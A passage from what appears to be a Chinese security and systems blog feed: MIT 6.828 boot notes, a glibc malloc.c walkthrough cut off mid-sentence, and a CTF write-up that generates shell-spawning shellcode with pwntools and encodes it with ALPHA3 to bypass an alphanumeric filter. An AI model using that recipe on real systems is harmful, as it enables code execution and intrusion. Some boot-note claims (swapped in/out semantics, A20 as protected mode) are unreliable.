%al，PortAddress向端口地址为PortAddress的端口写入值，值为al寄存器中的值</span><br><span class="line">out PortAddress，%al把端口地址为PortAddress的端口中的值读入寄存器al中</span><br></pre></td></tr></table></figure><p>​    <strong>标准规定端口操作必须要用al寄存器作为缓冲</strong></p><p>​    那么这三条指令就是要操作端口0x70，0x71，它们对应的是什么设备呢。根据下面的链接查询</p><p><a href="http://bochs.sourceforge.net/techspec/PORTS.LST">http://bochs.sourceforge.net/techspec/PORTS.LST</a></p><p>​    从中可以知道，0x70端口和0x71端口是用于控制系统中一个叫CMOS的设备，这个设备是一个低功耗的存储设备，它可以用于在计算机时存储一些信息，它是由独立的电池供电的。这里有详细介绍<a href="https://wiki.osdev.org/CMOS">https://wiki.osdev.org/CMOS</a></p><p>​    这个CMOS中可以控制跟PC相关的多个功能，其中最重要的就是<strong>时钟设备</strong>的，它还可以控制是否<strong>响应不可屏蔽中断</strong>。</p><p>​    操作CMOS存储器中的内容需要两个端口，一个是0x70另一个就是0x71。其中0x70可以叫做索引寄存器，<strong>这个8位寄存器是不可屏蔽中断（NMI）使能位。如果你把这个位置1，则NMI不会被响应。低七位用于指定CMOS存储器中的存储单元地址**</strong>，所以如果你想访问第1号存储单元，并且在访问时，我要使能NMI，那么你就应该向端口0x70里面送入10000001=0x81。</p><p>即</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov $0x81, %al</span><br><span class="line">out %al, 0x70</span><br></pre></td></tr></table></figure><p>​    然后对于这个地址单元的操作，比如读或者写就可以由0x71端口完成，比如你现在想从1号存储单元里面读出它的值，在完成上面的两条指令后，就可以下面输入这条指令　</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">in $0x71, %al </span><br></pre></td></tr></table></figure><p>​    再回到我们的系统，这三条指令可以看出，它首先关闭了NMI中断，并且要访问存储单元0xF的值，并且把值读到al中，但是在后面我们发现这个值并没有被利用，所以可以认为这三条指令是用来关闭NMI中断的。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">15. 0xfd16b:  in  $0x92, %al</span><br><span class="line">16. 0xfd16d:  or  $0x2, %al</span><br><span class="line">17. 0xfd16f:  out  %al, $0x92</span><br></pre></td></tr></table></figure><p>​    这三步操作又是在控制端口，此时被控制的端口是0x92，通过上面的链接我们可以查到，它控制的是PS/2系统控制端口A，而第16，17步的操作明显是把这个端口的1号bit置为1。这个端口的bit1的功能是</p><p>​        <code>bit 1 = 1 indicates A20 active</code></p><p>​    即A20位，即第21个地址线被使能，了解过实模式和保护模式的肯定知道，如果A20地址线被激活，那么系统工作在保护模式下，但是在boot loader程序中，计算机首先要工作在实模式下。所以这里的操作应该是测试可用内存空间。在boot loader之前，它肯定还会转回实模式。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">18. 0xfd171:  lidtw  %cs:0x6ab8</span><br></pre></td></tr></table></figure><p>​    lidt指令：加载中断向量表寄存器（IDTR）。这个指令会把从地址0xf6ab8起始的后面6个字节的数据读入到中断向量表寄存器（IDTR）中。中断是操作系统中非常重要的一部分，有了中断操作系统才能真正实现进程。每一种中断都有自己对应的中断处理程序，那么这个中断的处理程序的首地址就叫做这个中断的中断向量。中断向量表自然是存放所有中断向量的表了。关于中断向量表的介绍，可以查看<a href="http://wiki.osdev.org/Interrupt_Descriptor_Table">http://wiki.osdev.org/Interrupt_Descriptor_Table</a> </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">19. 0xfd177:  lgdtw  %cs:0x6a74</span><br></pre></td></tr></table></figure><p>​    把从0xf6a74为起始地址处的6个字节的值加载到全局描述符表格寄存器GDTR中。这个表是实现保护模式非常重要的一部分，我们在介绍boot loader时会具体介绍它。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">20. 0xfd17d:  mov  %cr0, %eax</span><br><span class="line">21. 0xfd180:  or  $0x1, %eax</span><br><span class="line">22. 0xfd184:  mov  %eax, %cr0</span><br></pre></td></tr></table></figure><p>​    计算机中包含<code>CR0 ~ CR3</code>四个控制寄存器，用来控制和确定处理器的操作模式。其中这三个语句的操作明显是要把CR0寄存器的最低位（0bit）置1。CR0寄存器的0bit是PE位，启动保护位，当该位被置1，代表开启了保护模式。但是这里出现了问题，我们刚刚说过BIOS是工作在实模式下，后面的boot loader开始的时候也是工作在实模式下，所以这里切换为保护模式，显然是自相矛盾。所以这里只能推测它在检测机器是否能工作在保护模式下。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">23. 0xfd187:  ljmpl $0x8, $0xfd18f</span><br><span class="line">24. 0xfd18f:  mov  $0x10, %eax</span><br><span class="line">25. 0xfd194:  mov  %eax, %ds</span><br><span class="line">26. 0xfd196:  mov  %eax, %es</span><br><span class="line">27. 0xfd198:  mov  %eax, %ss</span><br><span class="line">28. 0xfd19a:  mov  %eax, %fs</span><br><span class="line">29. 0xfd19c:  mov  %eax, %gs</span><br></pre></td></tr></table></figure><p>这里的23~29步之所以这么做是按照规定来的，<a href="https://en.wikibooks.org/wiki/X86_Assembly/Global_Descriptor_Table">https://en.wikibooks.org/wiki/X86_Assembly/Global_Descriptor_Table</a> 链接中指出，要完成加载GDTR的过程需要重新加载段寄存器，即如果刚刚加载完GDTR寄存器我们必须要重新加载所有的段寄存器的值，而其中CS段寄存器必须通过长跳转指令，即23号指令来进行加载。所以这些步骤是在第19步完成后必须要做的。这样才能是GDTR的值生效。</p><p>目前只能分析到这里。</p><h2 id="Appendix：实模式和保护模式"><a href="#Appendix：实模式和保护模式" class="headerlink" title="Appendix：实模式和保护模式"></a>Appendix：实模式和保护模式</h2><p>首先我们要知道这两种模式都是CPU的工作模式，实模式是早期CPU运行的工作模式，而保护模式则是现代CPU运行的模式。但是为什么现代CPU在运行boot loader时仍旧要先进入实模式呢？就是为了实现软件的向后兼容性不得已才这样的。</p><p>下面我们分别看下这两种工作模式的基本原理。</p><p><strong>实模式</strong></p><p>实模式出现于早期8086CPU时期。当时由于CPU的性能有限，一共只有20位地址线（所以地址空间只有1MB），以及8个16位的通用寄存器，以及4个16位的段寄存器。所以为了能够通过这些16位的寄存器去构成20位的主存地址，必须采用一种特殊的方式。当某个指令想要访问某个内存地址时，它通常需要用下面的这种格式来表示：（段基址：段偏移量）</p><p>其中第一个字段是段基址，它的值是由段寄存器提供的。段寄存器有4种，%cs，%ds，%ss，%es。具体这个指令采用哪个段寄存器是由这个指令的类型来决定的。比如要取指令就是采用%cs寄存器，要读取或者写入数据就用%ds寄存器。总之，不管什么指令，都会有一个段寄存器提供一个16位的段基址。</p><p>第二个字段是段内偏移量，代表你要访问的这个内存地址距离这个段基址的距离。它的值就是由通用寄存器来提供的，所以也是16位。那么问题来了：两个16位的值如何组合成一个20位的地址呢？这里采用的方式是把段寄存器所提供的段基址先向左移4位。这样就变成了一个20位的值，然后再与段偏移量相加。所以公式如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">物理地址 &#x3D; 段基址 &lt;&lt; 4 + 段内偏移</span><br></pre></td></tr></table></figure><p>以上就是实模式访问内存地址的原理。</p><p><strong>保护模式</strong></p><p>随着CPU的发展，CPU的地址线的个数从原来的20根变成了现在的32根，所以可以访问的内存空间从1MB变成了现在的4GB，寄存器的位数也变成了32位。所以实模式下的内存地址计算方式就已经不再适合了。所以就引入了现在的保护模式，实现更大的空间，更灵活的内存访问。</p><p>在介绍保护模式的工作原理之前，先介绍几个容易混淆的概念。逻辑地址，虚拟地址，线性地址，物理地址。</p><p>我们都知道，如今在编写程序时，程序是运行在虚拟地址空间下的，也就是说，在程序员编写程序时指令中出现的地址并不一定是这个程序在内存中运行时真正要访问的内存地址。这样做的目的是为了能够让程序员在编程时不需要之间操作真实地址，并且如果能够之间操作物理地址，肯定是不安全的，因为当它在真实运行时，内存中各个程序的分布情况是不可能在编写程序时就知道的。所以这个程序的这条指令到底要访问哪个内存单元是由操作系统来确定的。所以这就是一个<strong>虚拟地址</strong>到真实主存中物理地址的转换。</p><p>那么<strong>逻辑地址</strong>又是什么呢？根据上面我们知道，程序员编写时看到的是虚拟地址，但是并不是说程序员直接把这个虚拟地址写道指令中的。它是由逻辑地址推导得到的。所以指令中真实出现的是逻辑地址，一个逻辑地址由两部分组成，一个是段选择子，一个是段内偏移。而且采用哪个段选择子通常也是在指令中隐含的，程序员通常只需要指明段内偏移量。然后分段管理机构会把逻辑地址转换为线性地址。如果该机器没用采用分页机制的话，此时的线性地址就是最后的主存物理地址。但是如果机器中还有分页设备的话，比如内存大小实际只有1G，但是根据前面我们知道可访问的空间有4G。所以此时还需要分页机构把线性地址转化为最终的真实物理地址。所以可见虚拟地址和线性地址的含义是差不多的。我们可以在下图中看到我们上面叙述的地址转换过程。在boot loader中，并没有分页机制。所以计算出来的线性地址就是真实要访问的主存地址。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13072026781/0" alt="image-20210119215131791"></p><p>那么在保护模式下我们是如何最终的物理地址的呢？</p><p>首先，在计算机中存在两个表，GDT，LDT。它们两个其实是同类型的表，前者叫做全局段描述符表，后者叫做本地段描述符表。他们都是用来存放关于某个运行在内存中的程序的分段信息的。比如某个程序的代码段是从哪里开始的，有多大；数据段又是从哪里开始的，又多大。GDT表全局可见，也就是说每一个运行在内存中的程序都能看到这个表。所以操作系统内核程序的段信息就存在这里面。还有一个LDT表，这个表是每一个在内存中的程序都包含的，里面指明了每一个程序的段信息。我们可以看一下这两个表的结构，如下图所示：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13072027516/0" alt="image-20210119215630208"></p><p>我们从图中可以看到，无论是GDT，还是LDT。每一个表项都包含三个字段：</p><ol><li>Base：32位，代表这个程序的这个段的基地址。</li><li>Limit：20位，代表这个程序的这个段的大小。</li><li>Flags：12位，代表这个程序的这个段的访问权限。</li></ol><p>当程序中给出逻辑地址（segment：offset）时，它不像实模式那样，用segment的值做段基址。而是把这个segment的值作为一个selector，代表这个段的段表项在GDT/LDT表的索引。比如你要访问的地址是segment：offset = 0x01：0x0000ffff，此时由于每个段表项的长度位8，所以应该取出地址8（索引为1）处的段表项。然后首先根据Flags字段来判断是否可以访问这个段的内容，这样做是为了能够实现进程间地址的保护。如果能够访问，则把Base字段的内容取出，直接与offset相加，就得到线性地址了。之后就是要根据是否有分页机制来进行地址转换了。</p><p>比如当前Base字段的值是0x00f0000，则最后线性地址的值为0x00fffff。</p><p>以上就是保护模式下内存地址的计算方法。</p><p>综上，通过上面的叙述可见，保护模式要比实模式灵活许多：</p><ol><li>实模式下段基址必须是16的整数倍，保护模式下段基址可以是4GB空间内的任意一个地址。</li><li>实模式下段的长度为65536，但是保护模式下段的长度也是可以达到4GB的。</li><li>保护模式下可以对内存的访问多加一层保护，但是实模式没有。</li></ol>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/01/22/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise2/#disqus_thread</comments>
    </item>
    
    <item>
      <title>【MIT 6.828】JOS学习笔记 Lab1【未完】</title>
      <link>https://billyotry.github.io/2021/01/22/%E3%80%90MIT6.828%E3%80%91JOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20Lab1/</link>
      <guid>https://billyotry.github.io/2021/01/22/%E3%80%90MIT6.828%E3%80%91JOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20Lab1/</guid>
      <pubDate>Fri, 22 Jan 2021 08:41:44 GMT</pubDate>
      <description>
      
        
        
          &lt;h2 id=&quot;Part-1-PC-Bootstrap&quot;&gt;&lt;a href=&quot;#Part-1-PC-Bootstrap&quot; class=&quot;headerlink&quot; title=&quot;Part 1: PC Bootstrap&quot;&gt;&lt;/a&gt;Part 1: PC Bootstrap&lt;/h2&gt;&lt;h3
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h2 id="Part-1-PC-Bootstrap"><a href="#Part-1-PC-Bootstrap" class="headerlink" title="Part 1: PC Bootstrap"></a>Part 1: PC Bootstrap</h2><h3 id="The-PC’s-Physical-Address-Space"><a href="#The-PC’s-Physical-Address-Space" class="headerlink" title="The PC’s Physical Address Space"></a>The PC’s Physical Address Space</h3><p>这一节我们深入探讨PC到底是如何启动的。首先看下通常一个PC的物理地址空间是如何布局：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+------------------+  &lt;- 0xFFFFFFFF (4GB) </span><br><span class="line">|      32-bit      | </span><br><span class="line">|  memory mapped   | </span><br><span class="line">|     devices      | </span><br><span class="line">|                  | </span><br><span class="line">&#x2F;\&#x2F;\&#x2F;\&#x2F;\&#x2F;\&#x2F;\&#x2F;\&#x2F;\&#x2F;\&#x2F;\ </span><br><span class="line">&#x2F;\&#x2F;\&#x2F;\&#x2F;\&#x2F;\&#x2F;\&#x2F;\&#x2F;\&#x2F;\&#x2F;\ </span><br><span class="line">|                  | </span><br><span class="line">|      Unused      | </span><br><span class="line">|                  | </span><br><span class="line">+------------------+  &lt;- depends on amount of RAM </span><br><span class="line">|                  | </span><br><span class="line">|                  | </span><br><span class="line">| Extended Memory  | </span><br><span class="line">|                  | </span><br><span class="line">|                  | </span><br><span class="line">+------------------+  &lt;- 0x00100000 (1MB) </span><br><span class="line">|     BIOS ROM     | </span><br><span class="line">+------------------+  &lt;- 0x000F0000 (960KB) </span><br><span class="line">|  16-bit devices, | </span><br><span class="line">|  expansion ROMs  | </span><br><span class="line">+------------------+  &lt;- 0x000C0000 (768KB) </span><br><span class="line">|   VGA Display    | </span><br><span class="line">+------------------+  &lt;- 0x000A0000 (640KB) </span><br><span class="line">|                  | </span><br><span class="line">|    Low Memory    | </span><br><span class="line">|                  | </span><br><span class="line">+------------------+  &lt;- 0x00000000</span><br></pre></td></tr></table></figure><p>这张图仅仅展示了内存空间的一部分。</p><p>第一代PC处理器是16位字长的Inter 8088处理器，这类处理器只能访问1MB的内存空间。早期的PC的物理地址空间是从<code>0x00000000</code>开始，但从<code>0x000FFFFF</code>而不是<code>0xFFFFFFFF</code>结束，即<code>0x00000000 ~ 0x000FFFFF</code>。但是这1MB的空间也不是用户都能利用到的，只有低640KB（<code>0x00000000 ~ 0x000A0000</code>）的地址空间是用户程序可以使用的。即只有标记位 “Low Memory”的640KB空间是早期的PC唯一可以使用的随机存器存储器（RAM）。如图所示。</p><p>而剩下的384KB（<code>0x000A0000 ~ 0x000FFFFF</code>）的高地址空间则被保留用作其他的目的，比如（<code>0x000A0000 ~ 0x000C0000</code>）被用作屏幕显示内容缓冲区，其他的则被非易失性存储器（ROM）所使用。其中最重要的一部分就是基本输入/输出系统（BIOS），占据了<code>0x000F0000 ~ 0x00100000</code> 的地址空间。BIOS负责进行一些基本的系统初始化任务，比如开启显卡，检测该系统的内存大小等等工作。在初始化完成后，BIOS就会从某个适当的地方（比如软盘，硬盘，CD-ROM或者网络）加载操作系统，并将计算机的控制权交给操作系统。</p><p>虽然Inter处理器突破了1MB内存空间，在80286和80386上已经实现了16MB，4GB的地址空间，但是PC的架构必须仍旧把原来的1MB的地址空间的结构保留下来，这样才能实现向后兼容。所以现代计算机的地址<code>0x000A0000 ~ 0x00100000</code>区间是一个空洞，不会被使用。因此这个空洞就把地址空间划分成了两部分，第一部分就是从<code>0x00000000 ~ 0x000A0000</code>，叫做传统内存。剩下的不包括空洞的其他部分叫做扩展内存。而对于这种32位字长处理器通常把BIOS存放到整个存储空间的顶端处。</p><p>由于xv6操作系统设计的一些限制，它只利用256MB的物理地址空间，即它假设用户的主机只有256MB的内存。</p><h3 id="The-ROM-BIOS"><a href="#The-ROM-BIOS" class="headerlink" title="The ROM BIOS"></a>The ROM BIOS</h3><p>现在我们利用qemu和gdb去探索PC机的启动过程。首先看一下如何利用这两个软件来实现对操作系统的debug。</p><p>首先我们在lab目录下打开终端输入 <code>make qemu-gdb</code> 后，再打开一个终端输入 <code>make gdb</code> 显示如下</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13071972822/0" alt="image-20210119162235532"></p><p>这样其实我们就可以开始调试了<del>~</del> 芜湖！</p><p>我们可以看到下面那一行：</p><p><code>[f000:fff0]  0xffff0: ljmp  $0xf000, $0xe05b</code></p><p>这条指令就是整个PC加电启动后，执行BIOS的第一条指令。</p><ul><li>PC从物理地址0x000ffff0开始执行，该地址位于ROM BIOS保留的64KB区域的最顶部。</li><li>PC从CS = 0xf000 和 IP = 0xfff0 开始执行。</li><li>要执行的第一条指令是跳转指令，它跳转到CS = 0xf000 和 IP = 0xe05b 开始执行。</li></ul><p>为什么QEMU要这样启动或者说PC启动是这样的。因为PC中的BIOS是”硬连线”到物理地址范围<code>0x000f0000 ~ 0x000fffff</code>，也就是说这是一种硬性的规定，在加电后就是必须且一定在0x000ffff0这个地方开始执行BIOS的第一条指令，即加电后CS = 0xf000 ，IP = 0xfff0。这样设计可以确保BIOS在加电或任何系统重新启动后始终首先控制计算机，至于为什么我们稍后了解。</p><p>QEMU带有自己的BIOS，它将其放置在处理器的模拟物理地址空间中的此位置，处理器复位后，此时进入实模式，并将CS设置为0xf000，将IP设置为0xfff0，以便从该段（CS:IP）开始执行。那么逻辑地址<code>0xf000：0xfff0</code> 是如何变成物理地址的？</p><p>实模式下的地址转换公式为：<code>16 * segment + offset</code></p><p>也就是 <code>0xf000 * 16  + 0xfff0 = 0x000ffff0</code></p><p>这里我们发现其实0xffff0与BOIS的结尾处0x100000只相差了16个字节，所以这里所作的第一件事就是jmp到BIOS中的较前的位置，毕竟仅仅16字节能完成多少工作？</p><p>综上，我们可以知道BIOS的操作就是在控制，初始化，检测各种底层的设备，比如时钟，GDTR寄存器，以及设置中断向量表等等。作为PC通电后运行的第一段程序，<strong>它最重要的功能是把操作系统从磁盘中导入内存，然后再把控制器交给操作系统。</strong>所以BIOS在运行的最后会去检测可以从当前系统的哪个设备中找到操作系统，通常来说是我们的磁盘，也有可能是U盘等等。等BIOS确定了，操作系统位于磁盘中，那么它就会把这个磁盘的第一个扇区，通常把它叫做启动区（boot sector）先加载到内存中，这个启动区中包括一个非常重要的程序 —– boot loader，它会负责完成整个操作系统从磁盘导入内存的工作，以及一些其他的非常重要的配置工作。最后操作系统才会开始运行。</p><p>所以PC启动后的运行顺序是 ：BIOS -&gt; boot loader -&gt; 操作系统内核</p><h2 id="Part-2-The-Boot-Loader"><a href="#Part-2-The-Boot-Loader" class="headerlink" title="Part 2: The Boot Loader"></a>Part 2: The Boot Loader</h2><p>PC的硬盘和软盘都可以划分一个个大小为512字节的区域，叫做扇区。一个扇区是一次磁盘操作的最小粒度。每一次读取或者写入操作都必须是一个或多个扇区。如果一个磁盘是可以被用来启动操作系统的，就把这个磁盘的第一个扇区叫做启动扇区。这一部分介绍的boot loader程序就位于这个启动扇区中。当BIOS找到一个可以启动的软盘或硬盘后，它就会把这512字节的启动扇区加载到内存地址<code>0x7c00 ~ 0x7dff</code>这个区域内，然后BIOS将CPU的控制权交给boot loader。</p><p>对于我们的课程6.828，我们将采用传统的硬盘启动机制，这就意味着我们的boot loader的大小必须小于512字节。整个boot loader是由一个汇编文件（<code>boot/boot.S</code>）以及一个C语言文件（<code>boot/main.c</code>）。boot loader必须完成两个主要的任务。</p><ol><li>首先，boot loader把处理器从实模式转换为32bit的保护模式，只有在这种模式下软件可以访问超过1MB空间的内容。</li><li>boot loader可以通过使用x86的特定的IO指令，直接访问IDE磁盘设备存储器，从磁盘读取内核。</li></ol><p>简单概括就是进保护模式，然后读内核。对于boot loader来说，有一个文件很重要（<code>obj/boot/boot.asm</code>）。这个文件是我们真实运行的boot loader程序的反汇编版本。所以我们可以把它和它的源代码即<code>boot.S</code>和<code>main.c</code>比较一下。</p><p>此处出门右转Lab1-Exercise3</p><p>最后回答下文章内提出的四个问题：</p><ol><li><strong>处理器是在上面时候开始运行于32bit模式？到底是什么把CPU从16位切换为32位工作模式？</strong></li></ol><ol start="2"><li><strong>boot loader中执行的最后一条语句是什么？内核被加载到内存中执行的第一条语句又是什么？</strong></li></ol><ol start="3"><li><strong>内核的第一条指令在哪里？</strong></li></ol><ol start="4"><li><strong>boot loader是如何知道它要读取多少个扇区才能把整个内核都送入内存的呢？在哪里找到这些信息？</strong></li></ol>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/01/22/%E3%80%90MIT6.828%E3%80%91JOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20Lab1/#disqus_thread</comments>
    </item>
    
    <item>
      <title>这是标题</title>
      <link>https://billyotry.github.io/2021/01/22/test/</link>
      <guid>https://billyotry.github.io/2021/01/22/test/</guid>
      <pubDate>Thu, 21 Jan 2021 17:14:34 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;&lt;strong&gt;just a test&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://inews.gtimg.com/newsapp_ls/0/13071917630/0&quot; alt=&quot;backgroud&quot;&gt;&lt;/p&gt;

        
      
      </description>
      
      
      <content:encoded><![CDATA[<p><strong>just a test</strong></p><p> <img src="https://inews.gtimg.com/newsapp_ls/0/13071917630/0" alt="backgroud"></p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/01/22/test/#disqus_thread</comments>
    </item>
    
    <item>
      <title>关于纯字符shellcode的编写</title>
      <link>https://billyotry.github.io/2021/01/22/%E5%85%B3%E4%BA%8E%E7%BA%AF%E5%AD%97%E7%AC%A6shellcode%E7%9A%84%E7%BC%96%E5%86%99/</link>
      <guid>https://billyotry.github.io/2021/01/22/%E5%85%B3%E4%BA%8E%E7%BA%AF%E5%AD%97%E7%AC%A6shellcode%E7%9A%84%E7%BC%96%E5%86%99/</guid>
      <pubDate>Thu, 21 Jan 2021 16:59:43 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;在上次MRCTF的时候遇到了一题，虽然只需要输入shellcode，但是对用户的输入字符进行了限制，只能有字母和数字这些可见字符。&lt;strong&gt;在此感谢TaQini师傅对于alphanumeric shellcode编写的指导！&lt;/strong&gt;具体参考TaQini师傅的
        
      
      </description>
      
      
      <content:encoded><![CDATA[<p>在上次MRCTF的时候遇到了一题，虽然只需要输入shellcode，但是对用户的输入字符进行了限制，只能有字母和数字这些可见字符。<strong>在此感谢TaQini师傅对于alphanumeric shellcode编写的指导！</strong>具体参考TaQini师傅的文章</p><p><a href='http://taqini.space/2020/03/31/alpha-shellcode-gen/#alphanumeric-shellcode'>纯字符shellcode生成指南</a></p><p>关键部分:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (i &lt; len) </span><br><span class="line">&#123;</span><br><span class="line">      <span class="keyword">if</span> (((((<span class="keyword">char</span>)buf[i] &lt; <span class="string">&#x27;a&#x27;</span>) || (<span class="string">&#x27;z&#x27;</span> &lt; (<span class="keyword">char</span>)buf[i])) &amp;&amp;</span><br><span class="line">          (((<span class="keyword">char</span>)buf[i] &lt; <span class="string">&#x27;A&#x27;</span> || (<span class="string">&#x27;Z&#x27;</span> &lt; (<span class="keyword">char</span>)buf[i])))) &amp;&amp;</span><br><span class="line">         (((<span class="keyword">char</span>)buf[i] &lt; <span class="string">&#x27;0&#x27;</span> || (<span class="string">&#x27;Z&#x27;</span> &lt; (<span class="keyword">char</span>)buf[i])))) </span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;I Can\&#x27;t Read This!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      i = i + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">buf();     <span class="comment">//可以看到程序会将我们的输入当成函数执行</span></span><br></pre></td></tr></table></figure><p>我们可以使用alpha3来将pwntools生成shellcode来转为alphanumeric shellcode.</p><p><code>1.python ALPHA3.py x64 ascii mixedcase rax --input=&quot;sc&quot;</code></p><p>在使用这条命令前我们还需要有pwntools生成的shellcode</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#filename  sc.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">str</span>(shellcode)</span><br></pre></td></tr></table></figure><p>如何将文件的输出输出到sc文件中(不能输出到终端复制过去,有不可见字符)</p><p><code>2.python sc.py &gt; sc</code></p><p>然后我们就可以用1命令生成alphanumeric shellcode(这里的shellcode是会输出的终端,如果你想输出到文件中的话可以去翻官方文档)        ——-&gt;         <a href='https://github.com/SkyLined/alpha3 '>alpha3</a></p><p><img src="https://i.loli.net/2020/04/15/Wi9Jhe4L1NdfDwq.png" alt="QQ图片20200415000820.png"></p><p>   Note:这里要还有要注意一个寄存器的问题,因为这里buf函数是<code>call rax</code>所以我们的1命令中使用<code>rax</code>.</p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/01/22/%E5%85%B3%E4%BA%8E%E7%BA%AF%E5%AD%97%E7%AC%A6shellcode%E7%9A%84%E7%BC%96%E5%86%99/#disqus_thread</comments>
    </item>
    
    <item>
      <title>【Glibc 源码分析】Glibc 2.23 -- malloc.c</title>
      <link>https://billyotry.github.io/2021/01/22/%E3%80%90Glibc%20%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E3%80%91Glibc%202.23%20--%20malloc.c/</link>
      <guid>https://billyotry.github.io/2021/01/22/%E3%80%90Glibc%20%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E3%80%91Glibc%202.23%20--%20malloc.c/</guid>
      <pubDate>Thu, 21 Jan 2021 16:59:43 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;源码来自:&lt;a href=&quot;https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c&quot;&gt;https://elixir.bootlin.com/glibc/glibc-2.23/source/mall
        
      
      </description>
      
      
      <content:encoded><![CDATA[<p>源码来自:<a href="https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c">https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c</a></p><h2 id="MMAP-support"><a href="#MMAP-support" class="headerlink" title="MMAP support"></a>MMAP support</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* ------------------ MMAP support ------------------  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> !defined(MAP_ANONYMOUS) &amp;&amp; defined(MAP_ANON)</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAP_ANONYMOUS MAP_ANON</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MAP_NORESERVE</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAP_NORESERVE 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MMAP(addr, size, prot, flags) \</span></span><br><span class="line"> __mmap((addr), (size), (prot), (flags)|MAP_ANONYMOUS|MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure><h2 id="Chunk-representations"><a href="#Chunk-representations" class="headerlink" title="Chunk representations"></a>Chunk representations</h2><h3 id="malloc-chunk-结构体"><a href="#malloc-chunk-结构体" class="headerlink" title="malloc_chunk 结构体"></a>malloc_chunk 结构体</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  -----------------------  Chunk representations -----------------------</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们在前面可以看见<code>#define INTERNAL_SIZE_T size_t</code>也就是说在64位的机器上，这个类型就是<code>unsigned long</code>类型</p><p>prev_size： 如果前一个块处于空闲状态，那么该值为前一个块的大小</p><p>size：记录当前块的大小</p><p>fd：当前块空闲时指向后一个空闲的chunk</p><p>bk：当前块空闲时指向前一个空闲的chunk</p><p>fd_nextsize：记录 